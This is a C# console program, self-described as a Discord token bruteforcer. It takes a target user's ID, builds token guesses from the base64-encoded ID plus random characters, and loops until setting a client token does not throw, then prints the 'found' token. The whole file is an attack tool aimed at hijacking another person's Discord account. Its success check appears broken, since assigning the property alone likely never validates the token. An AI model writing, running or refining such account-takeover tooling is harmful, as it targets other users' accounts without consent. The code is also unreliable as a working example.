using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Discord;

namespace DiscordTokenBruteforcer
{
    class Program
    {
        public static DiscordClient client = new DiscordClient();
        private static Random random = new Random();
        public static ulong id = 0;
        public static int attempts = 0;
        public static string RandomString(int length)
        {
            const string chars = "abcdefghikjlmnopqrstuvwxyz-_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        static void Main(string[] args)
        {
            var started = 0;
            Console.Title = ("Azula's Discord Token Bruteforcer v0.1");
            Console.WriteLine("Welcome to Azula's Discord Token Bruteforcer.\nEnter your ID to bruteforce: ");
            try { id = Convert.ToUInt64(Regex.Match(Console.ReadLine(), @"\d+").Value); }
            catch (Exception ex) { Console.Clear(); Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine(ex); Thread.Sleep(-1); }
            Console.Clear();
            while (true)
            {
                var token = (Base64Encode(id.ToString()) + "." + RandomString(6) + "." + RandomString(27));
                if (started == 0) { Console.WriteLine("########################################"); }
                started = 1;
                Console.Title = ("Azula's Discord Token Bruteforcer v0.1 | Attempts: " + attempts);
                Console.WriteLine(">> " + token + " <<");
                Console.WriteLine("########################################");
                attempts = attempts + 1;
                try { client.Token = token; Console.Clear(); Console.WriteLine(token); break; } catch { }
            }
        }
    }
}
